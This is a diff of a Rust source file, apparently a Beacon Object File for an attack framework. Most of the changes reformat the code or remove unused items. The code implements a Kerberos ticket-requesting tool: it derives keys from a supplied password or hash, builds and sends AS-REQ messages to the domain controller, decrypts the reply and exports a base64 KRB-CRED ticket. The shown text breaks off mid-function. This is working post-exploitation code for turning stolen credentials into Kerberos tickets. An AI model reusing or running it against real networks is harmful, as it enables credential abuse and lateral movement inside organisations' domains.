@@ -30,9 +30,6 @@ use rustbof::{eprintln, println};
 use windows_sys::Win32::Foundation::*;
 use windows_sys::Win32::Networking::WinSock::*;
 use windows_sys::Win32::Security::Authentication::Identity::*;
-use windows_sys::Win32::Security::*;
-use windows_sys::Win32::System::Threading::*;
-
 
 struct Asn {
     class: u8,
@@ -47,38 +44,67 @@ fn parse_asn(data: &[u8]) -> Option<Asn> {
 }
 
 fn parse_one(data: &[u8], mut pos: usize) -> Option<(Asn, usize)> {
-    if pos >= data.len() { return None; }
-    let b = data[pos]; pos += 1;
+    if pos >= data.len() {
+        return None;
+    }
+    let b = data[pos];
+    pos += 1;
     let class = (b >> 6) & 0x03;
     let constructed = (b & 0x20) != 0;
     let mut tag = (b & 0x1F) as u32;
     if tag == 0x1F {
         tag = 0;
         loop {
-            if pos >= data.len() { return None; }
-            let b = data[pos]; pos += 1;
+            if pos >= data.len() {
+                return None;
+            }
+            let b = data[pos];
+            pos += 1;
             tag = (tag << 7) | (b & 0x7F) as u32;
-            if b & 0x80 == 0 { break; }
+            if b & 0x80 == 0 {
+                break;
+            }
         }
     }
-    if pos >= data.len() { return None; }
-    let len_byte = data[pos]; pos += 1;
+    if pos >= data.len() {
+        return None;
+    }
+    let len_byte = data[pos];
+    pos += 1;
     let length = if len_byte < 0x80 {
         len_byte as usize
     } else if len_byte == 0x80 {
         return None;
     } else {
         let num = (len_byte & 0x7F) as usize;
-        if pos + num > data.len() { return None; }
+        if pos + num > data.len() {
+            return None;
+        }
         let mut l = 0usize;
-        for i in 0..num { l = (l << 8) | data[pos + i] as usize; }
+        for i in 0..num {
+            l = (l << 8) | data[pos + i] as usize;
+        }
         pos += num;
         l
     };
-    if pos + length > data.len() { return None; }
+    if pos + length > data.len() {
+        return None;
+    }
     let value = data[pos..pos + length].to_vec();
-    let children = if constructed { parse_children(&value) } else { Vec::new() };
-    Some((Asn { class, tag, value, children }, pos + length))
+    let children = if constructed {
+        parse_children(&value)
+    } else {
+        Vec::new()
+    };
+    Some((
+        Asn {
+            class,
+            tag,
+            value,
+            children,
+        },
+        pos + length,
+    ))
 }
 
 fn parse_children(data: &[u8]) -> Vec<Asn> {
@@ -88,20 +114,26 @@ fn parse_children(data: &[u8]) -> Vec<Asn> {
         if let Some((child, new_pos)) = parse_one(data, pos) {
             children.push(child);
             pos = new_pos;
-        } else { break; }
+        } else {
+            break;
+        }
     }
     children
 }
 
-fn find_ctx<'a>(asn: &'a Asn, tag: u32) -> Option<&'a Asn> {
+fn find_ctx(asn: &Asn, tag: u32) -> Option<&Asn> {
     asn.children.iter().find(|c| c.class == 2 && c.tag == tag)
 }
 
 fn get_int(asn: &Asn) -> i64 {
     let data = &asn.value;
-    if data.is_empty() { return 0; }
+    if data.is_empty() {
+        return 0;
+    }
     let mut val = if data[0] & 0x80 != 0 { -1i64 } else { 0i64 };
-    for &b in data { val = (val << 8) | b as i64; }
+    for &b in data {
+        val = (val << 8) | b as i64;
+    }
     val
 }
 
@@ -112,7 +144,6 @@ fn get_string(asn: &Asn) -> String {
 fn get_octet_string(asn: &Asn) -> Vec<u8> {
     asn.value.clone()
 }
-
 
 fn asn_tag_len(tag_byte: u8, data: &[u8]) -> Vec<u8> {
     let mut out = vec![tag_byte];
@@ -138,7 +169,9 @@ fn asn_tag_len(tag_byte: u8, data: &[u8]) -> Vec<u8> {
 
 fn asn_seq(children: &[&[u8]]) -> Vec<u8> {
     let mut data = Vec::new();
-    for c in children { data.extend_from_slice(c); }
+    for c in children {
+        data.extend_from_slice(c);
+    }
     asn_tag_len(0x30, &data)
 }
 
@@ -151,15 +184,25 @@ fn asn_app(tag: u8, inner: &[u8]) -> Vec<u8> {
 }
 
 fn asn_int(val: i64) -> Vec<u8> {
-    if val == 0 { return vec![0x02, 0x01, 0x00]; }
+    if val == 0 {
+        return vec![0x02, 0x01, 0x00];
+    }
     let mut bytes = Vec::new();
     let mut v = val;
     if val > 0 {
-        while v > 0 { bytes.push((v & 0xff) as u8); v >>= 8; }
+        while v > 0 {
+            bytes.push((v & 0xff) as u8);
+            v >>= 8;
+        }
         bytes.reverse();
-        if bytes[0] & 0x80 != 0 { bytes.insert(0, 0); }
+        if bytes[0] & 0x80 != 0 {
+            bytes.insert(0, 0);
+        }
     } else {
-        while v < -1 { bytes.push((v & 0xff) as u8); v >>= 8; }
+        while v < -1 {
+            bytes.push((v & 0xff) as u8);
+            v >>= 8;
+        }
         bytes.push((v & 0xff) as u8);
         bytes.reverse();
     }
@@ -168,21 +211,31 @@ fn asn_int(val: i64) -> Vec<u8> {
     out
 }
 
-fn asn_oct(data: &[u8]) -> Vec<u8> { asn_tag_len(0x04, data) }
+fn asn_oct(data: &[u8]) -> Vec<u8> {
+    asn_tag_len(0x04, data)
+}
 
-fn asn_str(s: &str) -> Vec<u8> { asn_tag_len(0x1b, s.as_bytes()) } // GeneralString
+fn asn_str(s: &str) -> Vec<u8> {
+    asn_tag_len(0x1b, s.as_bytes())
+} // GeneralString
 
 fn asn_bit(data: &[u8]) -> Vec<u8> {
     let mut out = vec![0x03];
     let l = data.len() + 1;
-    if l < 0x80 { out.push(l as u8); }
-    else { out.push(0x81); out.push(l as u8); }
+    if l < 0x80 {
+        out.push(l as u8);
+    } else {
+        out.push(0x81);
+        out.push(l as u8);
+    }
     out.push(0x00); // unused bits
     out.extend_from_slice(data);
     out
 }
 
-fn asn_time(s: &str) -> Vec<u8> { asn_tag_len(0x18, s.as_bytes()) }
+fn asn_time(s: &str) -> Vec<u8> {
+    asn_tag_len(0x18, s.as_bytes())
+}
 
 fn asn_ctx_int(tag: u8, val: i64) -> Vec<u8> {
     let i = asn_int(val);
@@ -194,17 +247,25 @@ fn asn_ctx_str(tag: u8, s: &str) -> Vec<u8> {
     asn_ctx(tag, &v)
 }
 
-
 const RC4_HMAC: i32 = 23;
 const AES256_CTS: i32 = 18;
 const AES128_CTS: i32 = 17;
 
 #[repr(C)]
-struct UnicodeStr { length: u16, maximum_length: u16, buffer: *mut u16 }
+struct UnicodeStr {
+    length: u16,
+    maximum_length: u16,
+    buffer: *mut u16,
+}
 #[repr(C)]
-struct AnsiStr { length: u16, maximum_length: u16, buffer: *const u8 }
+struct AnsiStr {
+    length: u16,
+    maximum_length: u16,
+    buffer: *const u8,
+}
 
-type HashPasswordNt6 = unsafe extern "system" fn(*const UnicodeStr, *const UnicodeStr, u32, *mut u8) -> i32;
+type HashPasswordNt6 =
+    unsafe extern "system" fn(*const UnicodeStr, *const UnicodeStr, u32, *mut u8) -> i32;
 type EncryptFn = unsafe extern "system" fn(*mut c_void, *const u8, u32, *mut u8, *mut u32) -> i32;
 type DecryptFn = unsafe extern "system" fn(*mut c_void, *const u8, u32, *mut u8, *mut u32) -> i32;
 type InitializeFn = unsafe extern "system" fn(*const u8, u32, u32, *mut *mut c_void) -> i32;
@@ -256,21 +317,37 @@ fn load_crypt_api() -> Option<CryptApi> {
     unsafe {
         let cryptdll = {
             let h = GetModuleHandleA(b"CRYPTDLL\0".as_ptr());
-            if h.is_null() { LoadLibraryA(b"CRYPTDLL\0".as_ptr()) } else { h }
+            if h.is_null() {
+                LoadLibraryA(b"CRYPTDLL\0".as_ptr())
+            } else {
+                h
+            }
         };
-        if cryptdll.is_null() { return None; }
+        if cryptdll.is_null() {
+            return None;
+        }
         let ntdll = GetModuleHandleA(b"ntdll.dll\0".as_ptr());
-        if ntdll.is_null() { return None; }
+        if ntdll.is_null() {
+            return None;
+        }
         let advapi = {
             let h = GetModuleHandleA(b"ADVAPI32\0".as_ptr());
-            if h.is_null() { LoadLibraryA(b"ADVAPI32\0".as_ptr()) } else { h }
+            if h.is_null() {
+                LoadLibraryA(b"ADVAPI32\0".as_ptr())
+            } else {
+                h
+            }
         };
-        if advapi.is_null() { return None; }
+        if advapi.is_null() {
+            return None;
+        }
 
         macro_rules! r {
             ($m:expr, $n:literal) => {{
                 let p = GetProcAddress($m, concat!($n, "\0").as_ptr());
-                if p.is_null() { return None; }
+                if p.is_null() {
+                    return None;
+                }
                 core::mem::transmute(p)
             }};
         }
@@ -292,14 +369,20 @@ fn str_to_unicode(api: &CryptApi, s: &str) -> Option<UnicodeStr> {
         let mut ansi = core::mem::zeroed::<AnsiStr>();
         (api.rtl_init_ansi)(&mut ansi, cstr.as_ptr());
         let mut uni = core::mem::zeroed::<UnicodeStr>();
-        if (api.rtl_ansi_to_unicode)(&mut uni, &ansi, 1) >= 0 { Some(uni) } else { None }
+        if (api.rtl_ansi_to_unicode)(&mut uni, &ansi, 1) >= 0 {
+            Some(uni)
+        } else {
+            None
+        }
     }
 }
 
 fn derive_key(api: &CryptApi, etype: i32, password: &str, salt: &str) -> Option<Vec<u8>> {
     unsafe {
         let mut csys: *const KerbEcrypt = core::ptr::null();
-        if (api.cd_locate)(etype, &mut csys) < 0 || csys.is_null() { return None; }
+        if (api.cd_locate)(etype, &mut csys) < 0 || csys.is_null() {
+            return None;
+        }
         let ks = (*csys).key_size as usize;
         let mut key = vec![0u8; ks];
         let mut pw = str_to_unicode(api, password)?;
@@ -311,41 +394,84 @@ fn derive_key(api: &CryptApi, etype: i32, password: &str, salt: &str) -> Option<
     }
 }
 
-fn encrypt_data(api: &CryptApi, key: &[u8], etype: i32, key_usage: u32, plaintext: &[u8]) -> Option<Vec<u8>> {
+fn encrypt_data(
+    api: &CryptApi,
+    key: &[u8],
+    etype: i32,
+    key_usage: u32,
+    plaintext: &[u8],
+) -> Option<Vec<u8>> {
     unsafe {
         let mut csys: *const KerbEcrypt = core::ptr::null();
-        if (api.cd_locate)(etype, &mut csys) < 0 || csys.is_null() { return None; }
+        if (api.cd_locate)(etype, &mut csys) < 0 || csys.is_null() {
+            return None;
+        }
         let mut ctx: *mut c_void = core::ptr::null_mut();
-        if ((*csys).initialize)(key.as_ptr(), (*csys).key_size, key_usage, &mut ctx) < 0 { return None; }
+        if ((*csys).initialize)(key.as_ptr(), (*csys).key_size, key_usage, &mut ctx) < 0 {
+            return None;
+        }
         let mut out_size = plaintext.len();
         let block_size = (*csys).block_size as usize;
         if block_size > 0 {
             let modulo = out_size % block_size;
-            if modulo != 0 { out_size += block_size - modulo; }
+            if modulo != 0 {
+                out_size += block_size - modulo;
+            }
         }
         out_size += (*csys).header_size as usize;
         let mut output = vec![0u8; out_size];
         let mut actual_size = out_size as u32;
-        let r = ((*csys).encrypt)(ctx, plaintext.as_ptr(), plaintext.len() as u32, output.as_mut_ptr(), &mut actual_size);
+        let r = ((*csys).encrypt)(
+            ctx,
+            plaintext.as_ptr(),
+            plaintext.len() as u32,
+            output.as_mut_ptr(),
+            &mut actual_size,
+        );
         ((*csys).finish)(&mut ctx);
-        if r >= 0 { output.truncate(actual_size as usize); Some(output) } else { None }
+        if r >= 0 {
+            output.truncate(actual_size as usize);
+            Some(output)
+        } else {
+            None
+        }
     }
 }
 
-fn decrypt_data(api: &CryptApi, key: &[u8], etype: i32, key_usage: u32, ciphertext: &[u8]) -> Option<Vec<u8>> {
+fn decrypt_data(
+    api: &CryptApi,
+    key: &[u8],
+    etype: i32,
+    key_usage: u32,
+    ciphertext: &[u8],
+) -> Option<Vec<u8>> {
     unsafe {
         let mut csys: *const KerbEcrypt = core::ptr::null();
-        if (api.cd_locate)(etype, &mut csys) < 0 || csys.is_null() { return None; }
+        if (api.cd_locate)(etype, &mut csys) < 0 || csys.is_null() {
+            return None;
+        }
         let mut ctx: *mut c_void = core::ptr::null_mut();
-        if ((*csys).initialize)(key.as_ptr(), (*csys).key_size, key_usage, &mut ctx) < 0 { return None; }
+        if ((*csys).initialize)(key.as_ptr(), (*csys).key_size, key_usage, &mut ctx) < 0 {
+            return None;
+        }
         let mut output = vec![0u8; ciphertext.len()];
         let mut actual_size = ciphertext.len() as u32;
-        let r = ((*csys).decrypt)(ctx, ciphertext.as_ptr(), ciphertext.len() as u32, output.as_mut_ptr(), &mut actual_size);
+        let r = ((*csys).decrypt)(
+            ctx,
+            ciphertext.as_ptr(),
+            ciphertext.len() as u32,
+            output.as_mut_ptr(),
+            &mut actual_size,
+        );
         ((*csys).finish)(&mut ctx);
-        if r >= 0 { output.truncate(actual_size as usize); Some(output) } else { None }
+        if r >= 0 {
+            output.truncate(actual_size as usize);
+            Some(output)
+        } else {
+            None
+        }
     }
 }
-
 
 fn send_to_kdc(server: &str, data: &[u8]) -> Option<Vec<u8>> {
     unsafe {
@@ -358,8 +484,8 @@ fn send_to_kdc(server: &str, data: &[u8]) -> Option<Vec<u8>> {
 
         let mut hints = core::mem::zeroed::<ADDRINFOA>();
         hints.ai_family = AF_INET as i32;
-        hints.ai_socktype = SOCK_STREAM as i32;
-        hints.ai_protocol = IPPROTO_TCP as i32;
+        hints.ai_socktype = SOCK_STREAM;
+        hints.ai_protocol = IPPROTO_TCP;
 
         let mut result: *mut ADDRINFOA = core::ptr::null_mut();
         if getaddrinfo(server_cstr.as_ptr(), b"88\0".as_ptr(), &hints, &mut result) != 0 {
@@ -373,7 +499,9 @@ fn send_to_kdc(server: &str, data: &[u8]) -> Option<Vec<u8>> {
             let ai = &*ptr;
             sock = socket(ai.ai_family, ai.ai_socktype, ai.ai_protocol);
             if sock != INVALID_SOCKET {
-                if connect(sock, ai.ai_addr, ai.ai_addrlen as i32) == 0 { break; }
+                if connect(sock, ai.ai_addr, ai.ai_addrlen as i32) == 0 {
+                    break;
+                }
                 closesocket(sock);
                 sock = INVALID_SOCKET;
             }
@@ -407,18 +535,28 @@ fn send_to_kdc(server: &str, data: &[u8]) -> Option<Vec<u8>> {
         let mut response = vec![0u8; resp_size];
         let mut received = 0usize;
         while received < resp_size {
-            let n = recv(sock, response.as_mut_ptr().add(received), (resp_size - received) as i32, 0);
-            if n <= 0 { break; }
+            let n = recv(
+                sock,
+                response.as_mut_ptr().add(received),
+                (resp_size - received) as i32,
+                0,
+            );
+            if n <= 0 {
+                break;
+            }
             received += n as usize;
         }
 
         closesocket(sock);
         WSACleanup();
 
-        if received == resp_size { Some(response) } else { None }
+        if received == resp_size {
+            Some(response)
+        } else {
+            None
+        }
     }
 }
-
 
 #[repr(C)]
 struct DomainControllerInfoA {
@@ -433,12 +571,15 @@ struct DomainControllerInfoA {
     client_site_name: *mut u8,
 }
 
-unsafe extern "system" {
-    fn GetComputerNameA(buf: *mut u8, size: *mut u32) -> i32;
-}
+unsafe extern "system" {}
 
 type DsGetDcNameAFn = unsafe extern "system" fn(
-    *const u8, *const u8, *const c_void, *const u8, u32, *mut *mut DomainControllerInfoA,
+    *const u8,
+    *const u8,
+    *const c_void,
+    *const u8,
+    u32,
+    *mut *mut DomainControllerInfoA,
 ) -> u32;
 type NetApiBufferFreeFn = unsafe extern "system" fn(*mut c_void) -> u32;
 
@@ -446,18 +587,36 @@ fn get_domain_info() -> Option<(String, String)> {
     unsafe {
         let netapi = {
             let h = GetModuleHandleA(b"NETAPI32\0".as_ptr());
-            if h.is_null() { LoadLibraryA(b"NETAPI32\0".as_ptr()) } else { h }
+            if h.is_null() {
+                LoadLibraryA(b"NETAPI32\0".as_ptr())
+            } else {
+                h
+            }
         };
-        if netapi.is_null() { return None; }
-
-        let ds_get: DsGetDcNameAFn = core::mem::transmute(GetProcAddress(netapi, b"DsGetDcNameA\0".as_ptr()));
-        let free_fn: NetApiBufferFreeFn = core::mem::transmute(GetProcAddress(netapi, b"NetApiBufferFree\0".as_ptr()));
-
-        let mut info: *mut DomainControllerInfoA = core::ptr::null_mut();
-        if ds_get(core::ptr::null(), core::ptr::null(), core::ptr::null(), core::ptr::null(), 0x40000010, &mut info) != 0 {
+        if netapi.is_null() {
             return None;
         }
-        if info.is_null() { return None; }
+
+        let ds_get: DsGetDcNameAFn =
+            core::mem::transmute(GetProcAddress(netapi, b"DsGetDcNameA\0".as_ptr()));
+        let free_fn: NetApiBufferFreeFn =
+            core::mem::transmute(GetProcAddress(netapi, b"NetApiBufferFree\0".as_ptr()));
+
+        let mut info: *mut DomainControllerInfoA = core::ptr::null_mut();
+        if ds_get(
+            core::ptr::null(),
+            core::ptr::null(),
+            core::ptr::null(),
+            core::ptr::null(),
+            0x40000010,
+            &mut info,
+        ) != 0
+        {
+            return None;
+        }
+        if info.is_null() {
+            return None;
+        }
 
         let domain = cstr_to_string((*info).domain_name);
         let dc_raw = cstr_to_string((*info).dc_name);
@@ -468,14 +627,17 @@ fn get_domain_info() -> Option<(String, String)> {
 }
 
 fn cstr_to_string(ptr: *const u8) -> String {
-    if ptr.is_null() { return String::new(); }
+    if ptr.is_null() {
+        return String::new();
+    }
     unsafe {
         let mut len = 0;
-        while *ptr.add(len) != 0 { len += 1; }
+        while *ptr.add(len) != 0 {
+            len += 1;
+        }
         String::from_utf8_lossy(core::slice::from_raw_parts(ptr, len)).into_owned()
     }
 }
-
 
 fn base64_encode(input: &[u8]) -> String {
     const C: &[u8] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
@@ -483,9 +645,24 @@ fn base64_encode(input: &[u8]) -> String {
     let mut o = Vec::with_capacity(ol);
     let mut i = 0;
     while i < input.len() {
-        let a = input[i] as u32; i += 1;
-        let b = if i < input.len() { let v = input[i] as u32; i += 1; v } else { i += 1; 0 };
-        let c = if i < input.len() { let v = input[i] as u32; i += 1; v } else { i += 1; 0 };
+        let a = input[i] as u32;
+        i += 1;
+        let b = if i < input.len() {
+            let v = input[i] as u32;
+            i += 1;
+            v
+        } else {
+            i += 1;
+            0
+        };
+        let c = if i < input.len() {
+            let v = input[i] as u32;
+            i += 1;
+            v
+        } else {
+            i += 1;
+            0
+        };
         let t = (a << 16) | (b << 8) | c;
         o.push(C[((t >> 18) & 0x3F) as usize]);
         o.push(C[((t >> 12) & 0x3F) as usize]);
@@ -493,20 +670,35 @@ fn base64_encode(input: &[u8]) -> String {
         o.push(C[(t & 0x3F) as usize]);
     }
     match input.len() % 3 {
-        1 => { if ol >= 2 { o[ol - 1] = b'='; o[ol - 2] = b'='; } }
-        2 => { if ol >= 1 { o[ol - 1] = b'='; } }
+        1 => {
+            if ol >= 2 {
+                o[ol - 1] = b'=';
+                o[ol - 2] = b'=';
+            }
+        }
+        2 => {
+            if ol >= 1 {
+                o[ol - 1] = b'=';
+            }
+        }
         _ => {}
     }
     unsafe { String::from_utf8_unchecked(o) }
 }
 
-
 fn get_current_time() -> String {
     unsafe {
         let mut st = core::mem::zeroed::<SYSTEMTIME>();
         GetSystemTime(&mut st);
-        alloc::format!("{:04}{:02}{:02}{:02}{:02}{:02}Z",
-            st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond)
+        alloc::format!(
+            "{:04}{:02}{:02}{:02}{:02}{:02}Z",
+            st.wYear,
+            st.wMonth,
+            st.wDay,
+            st.wHour,
+            st.wMinute,
+            st.wSecond
+        )
     }
 }
 
@@ -515,22 +707,38 @@ fn get_future_time(hours: u16) -> String {
         let mut st = core::mem::zeroed::<SYSTEMTIME>();
         GetSystemTime(&mut st);
         st.wHour += hours;
-        if st.wHour >= 24 { st.wHour -= 24; st.wDay += 1; }
-        alloc::format!("{:04}{:02}{:02}{:02}{:02}{:02}Z",
-            st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond)
+        if st.wHour >= 24 {
+            st.wHour -= 24;
+            st.wDay += 1;
+        }
+        alloc::format!(
+            "{:04}{:02}{:02}{:02}{:02}{:02}Z",
+            st.wYear,
+            st.wMonth,
+            st.wDay,
+            st.wHour,
+            st.wMinute,
+            st.wSecond
+        )
     }
 }
 
 unsafe extern "system" {
     fn GetSystemTime(st: *mut SYSTEMTIME);
-    fn Sleep(ms: u32);
 }
 
 fn build_as_req(
-    api: &CryptApi, user: &str, domain: &str, key: &[u8], etype: i32, pac: bool,
+    api: &CryptApi,
+    user: &str,
+    domain: &str,
+    key: &[u8],
+    etype: i32,
+    pac: bool,
 ) -> Option<Vec<u8>> {
     let mut nonce = [0u8; 4];
-    unsafe { (api.rand)(nonce.as_mut_ptr(), 4); }
+    unsafe {
+        (api.rand)(nonce.as_mut_ptr(), 4);
+    }
     let nonce_val = u32::from_le_bytes(nonce) as i64;
 
     let kdc_options: u32 = 0x40810010; // forwardable | renewable | canonicalize | renewable-ok
@@ -542,11 +750,9 @@ fn build_as_req(
             &asn_ctx_int(0, etype as i64),
             &asn_ctx(2, &asn_oct(&enc_timestamp)),
         ]);
-        let mut enc_data_bytes = Vec::new();
         let padata_type = asn_ctx_int(1, 2); // PADATA_ENC_TIMESTAMP = 2
         let padata_value = asn_ctx(2, &asn_oct(&enc_data));
-        enc_data_bytes = asn_seq(&[&padata_type, &padata_value]);
-        enc_data_bytes
+        asn_seq(&[&padata_type, &padata_value])
     };
 
     let pac_request = {
@@ -589,8 +795,8 @@ fn build_as_req(
     ]);
 
     let as_req_body = asn_seq(&[
-        &asn_ctx_int(1, 5),     // pvno
-        &asn_ctx_int(2, 10),    // msg-type (AS-REQ)
+        &asn_ctx_int(1, 5),  // pvno
+        &asn_ctx_int(2, 10), // msg-type (AS-REQ)
         &pa_data_ctx,
         &asn_ctx(4, &req_body),
     ]);
@@ -605,10 +811,7 @@ fn build_enc_timestamp(api: &CryptApi, key: &[u8], etype: i32) -> Option<Vec<u8>
     encrypt_data(api, key, etype, 1, &timestamp_asn)
 }
 
-
-fn handle_as_rep(
-    api: &CryptApi, response: &[u8], key: &[u8], etype: i32,
-) -> Option<String> {
+fn handle_as_rep(api: &CryptApi, response: &[u8], key: &[u8], etype: i32) -> Option<String> {
     let root = parse_asn(response)?;
 
     if root.tag == 30 {
@@ -637,7 +840,7 @@ fn handle_as_rep(
 
     let crealm = find_ctx(body, 3)
         .and_then(|c| c.children.first())
-        .map(|c| get_string(c))
+        .map(get_string)
         .unwrap_or_default();
 
     let ticket_ctx = find_ctx(body, 5)?;
@@ -653,9 +856,13 @@ fn handle_as_rep(
 
     let cipher = find_ctx(enc_data_seq, 2)
         .and_then(|c| c.children.first())
-        .map(|c| get_octet_string(c))?;
+        .map(get_octet_string)?;
 
-    let key_usage: u32 = if rep_etype == AES128_CTS || rep_etype == AES256_CTS { 3 } else { 8 };
+    let key_usage: u32 = if rep_etype == AES128_CTS || rep_etype == AES256_CTS {
+        3
+    } else {
+        8
+    };
     let plaintext = decrypt_data(api, key, etype, key_usage, &cipher)?;
 
     let dec_asn = parse_asn(&plaintext)?;
@@ -669,34 +876,33 @@ fn handle_as_rep(
     let session_key_seq = session_key_ctx.children.first()?;
     let sk_type = find_ctx(session_key_seq, 0)
         .and_then(|c| c.children.first())
-        .map(|c| get_int(c))
+        .map(get_int)
         .unwrap_or(0);
     let sk_value = find_ctx(session_key_seq, 1)
         .and_then(|c| c.children.first())
-        .map(|c| get_octet_string(c))
+        .map(get_octet_string)
         .unwrap_or_default();
 
     let flags_raw = find_ctx(enc_rep, 5)
         .and_then(|c| c.children.first())
-        .map(|c| &c.value)
-        .cloned()
+        .map(|c| asn_tag_len(0x03, &c.value))
         .unwrap_or_default();
 
     let starttime = find_ctx(enc_rep, 6)
         .and_then(|c| c.children.first())
-        .map(|c| get_string(c))
+        .map(get_string)
         .unwrap_or_default();
     let endtime = find_ctx(enc_rep, 7)
         .and_then(|c| c.children.first())
-        .map(|c| get_string(c))
+        .map(get_string)
         .unwrap_or_default();
     let renew_till = find_ctx(enc_rep, 8)
         .and_then(|c| c.children.first())
-        .map(|c| get_string(c))
+        .map(get_string)
         .unwrap_or_default();
     let srealm = find_ctx(enc_rep, 9)
         .and_then(|c| c.children.first())
-        .map(|c| get_string(c))
+        .map(get_string)
         .unwrap_or_default();
 
     let cname_ctx = find_ctx(body, 4)?;
@@ -705,57 +911,83 @@ fn handle_as_rep(
     let sname_ctx = find_ctx(enc_rep, 10);
     let sname_raw = sname_ctx.map(|c| &c.value);
 
-    let session_key_asn = asn_ctx(0, &asn_seq(&[
-        &asn_ctx_int(0, sk_type),
-        &asn_ctx(1, &asn_oct(&sk_value)),
-    ]));
+    let session_key_asn = asn_ctx(
+        0,
+        &asn_seq(&[&asn_ctx_int(0, sk_type), &asn_ctx(1, &asn_oct(&sk_value))]),
+    );
     let prealm_asn = asn_ctx_str(1, &crealm);
     let pname_asn = asn_ctx(2, cname_raw);
-    let flags_asn = if flags_raw.len() > 0 { asn_ctx(3, &flags_raw) } else { Vec::new() };
-    let start_asn = if !starttime.is_empty() { asn_ctx(6, &asn_time(&starttime)) } else { Vec::new() };
+    let flags_asn = if !flags_raw.is_empty() {
+        asn_ctx(3, &flags_raw)
+    } else {
+        Vec::new()
+    };
+    let start_asn = if !starttime.is_empty() {
+        asn_ctx(6, &asn_time(&starttime))
+    } else {
+        Vec::new()
+    };
     let end_asn = asn_ctx(7, &asn_time(&endtime));
-    let renew_asn = if !renew_till.is_empty() { asn_ctx(8, &asn_time(&renew_till)) } else { Vec::new() };
+    let renew_asn = if !renew_till.is_empty() {
+        asn_ctx(8, &asn_time(&renew_till))
+    } else {
+        Vec::new()
+    };
     let srealm_asn = asn_ctx_str(9, &srealm);
-    let sname_asn = if let Some(sr) = sname_raw { asn_ctx(10, sr) } else { Vec::new() };
+    let sname_asn = if let Some(sr) = sname_raw {
+        asn_ctx(10, sr)
+    } else {
+        Vec::new()
+    };
 
     let mut cred_info_parts: Vec<&[u8]> = Vec::new();
     cred_info_parts.push(&session_key_asn);
     cred_info_parts.push(&prealm_asn);
     cred_info_parts.push(&pname_asn);
-    if !flags_asn.is_empty() { cred_info_parts.push(&flags_asn); }
-    if !start_asn.is_empty() { cred_info_parts.push(&start_asn); }
+    if !flags_asn.is_empty() {
+        cred_info_parts.push(&flags_asn);
+    }
+    if !start_asn.is_empty() {
+        cred_info_parts.push(&start_asn);
+    }
     cred_info_parts.push(&end_asn);
-    if !renew_asn.is_empty() { cred_info_parts.push(&renew_asn); }
+    if !renew_asn.is_empty() {
+        cred_info_parts.push(&renew_asn);
+    }
     cred_info_parts.push(&srealm_asn);
-    if !sname_asn.is_empty() { cred_info_parts.push(&sname_asn); }
+    if !sname_asn.is_empty() {
+        cred_info_parts.push(&sname_asn);
+    }
 
     let cred_info = asn_seq(&cred_info_parts);
-    let enc_krb_cred_part = asn_app(29, &asn_seq(&[
-        &asn_ctx(0, &asn_seq(&[&cred_info])),
-    ]));
+    let enc_krb_cred_part = asn_app(29, &asn_seq(&[&asn_ctx(0, &asn_seq(&[&cred_info]))]));
 
     let enc_data = asn_seq(&[
         &asn_ctx_int(0, 0),
         &asn_ctx(2, &asn_oct(&enc_krb_cred_part)),
     ]);
 
-    let krb_cred = asn_app(22, &asn_seq(&[
-        &asn_ctx_int(0, 5),
-        &asn_ctx_int(1, 22),
-        &asn_ctx(2, &asn_seq(&[ticket_raw.as_slice()])),
-        &asn_ctx(3, &enc_data),
-    ]));
+    let krb_cred = asn_app(
+        22,
+        &asn_seq(&[
+            &asn_ctx_int(0, 5),
+            &asn_ctx_int(1, 22),
+            &asn_ctx(2, &asn_seq(&[ticket_raw.as_slice()])),
+            &asn_ctx(3, &enc_data),
+        ]),
+    );
 
     Some(base64_encode(&krb_cred))
 }
-
 
 fn get_param<'a>(params: &'a str, name: &str) -> Option<&'a str> {
     if let Some(pos) = params.find(name) {
         let after = &params[pos + name.len()..];
         let end = after.find(' ').unwrap_or(after.len());
         let value = &after[..end];
-        if !value.is_empty() { return Some(value); }
+        if !value.is_empty() {
+            return Some(value);
+        }
     }
     None
 }
@@ -765,7 +997,9 @@ fn has_flag(params: &str, name: &str) -> bool {
 }
 
 fn hex_decode(s: &str) -> Option<Vec<u8>> {
-    if s.len() % 2 != 0 { return None; }
+    if s.len() % 2 != 0 {
+        return None;
+    }
     let mut out = Vec::with_capacity(s.len() / 2);
     let b = s.as_bytes();
     let mut i = 0;
@@ -787,47 +1021,76 @@ fn hex_digit(c: u8) -> Option<u8> {
     }
 }
 
-
 fn base64_decode_vec(input: &str) -> Option<Vec<u8>> {
     let input = input.as_bytes();
     let mut padding = 0;
-    if input.is_empty() { return None; }
-    if input[input.len() - 1] == b'=' { padding += 1; }
-    if input.len() > 1 && input[input.len() - 2] == b'=' { padding += 1; }
+    if input.is_empty() {
+        return None;
+    }
+    if input[input.len() - 1] == b'=' {
+        padding += 1;
+    }
+    if input.len() > 1 && input[input.len() - 2] == b'=' {
+        padding += 1;
+    }
     let out_len = (input.len() * 3) / 4 - padding;
     let mut output = Vec::with_capacity(out_len);
     let mut i = 0;
     while i < input.len() {
-        let a = b64v(input[i]); i += 1;
-        let b = if i < input.len() { b64v(input[i]) } else { 0 }; i += 1;
-        let c = if i < input.len() { b64v(input[i]) } else { 0 }; i += 1;
-        let d = if i < input.len() { b64v(input[i]) } else { 0 }; i += 1;
+        let a = b64v(input[i]);
+        i += 1;
+        let b = if i < input.len() { b64v(input[i]) } else { 0 };
+        i += 1;
+        let c = if i < input.len() { b64v(input[i]) } else { 0 };
+        i += 1;
+        let d = if i < input.len() { b64v(input[i]) } else { 0 };
+        i += 1;
         let t = (a << 18) | (b << 12) | (c << 6) | d;
-        if output.len() < out_len { output.push(((t >> 16) & 0xFF) as u8); }
-        if output.len() < out_len { output.push(((t >> 8) & 0xFF) as u8); }
-        if output.len() < out_len { output.push((t & 0xFF) as u8); }
+        if output.len() < out_len {
+            output.push(((t >> 16) & 0xFF) as u8);
+        }
+        if output.len() < out_len {
+            output.push(((t >> 8) & 0xFF) as u8);
+        }
+        if output.len() < out_len {
+            output.push((t & 0xFF) as u8);
+        }
     }
     Some(output)
 }
 
 fn b64v(c: u8) -> u32 {
     match c {
-        b'A'..=b'Z' => (c - b'A') as u32, b'a'..=b'z' => (c - b'a' + 26) as u32,
-        b'0'..=b'9' => (c - b'0' + 52) as u32, b'+' => 62, b'/' => 63, _ => 0,
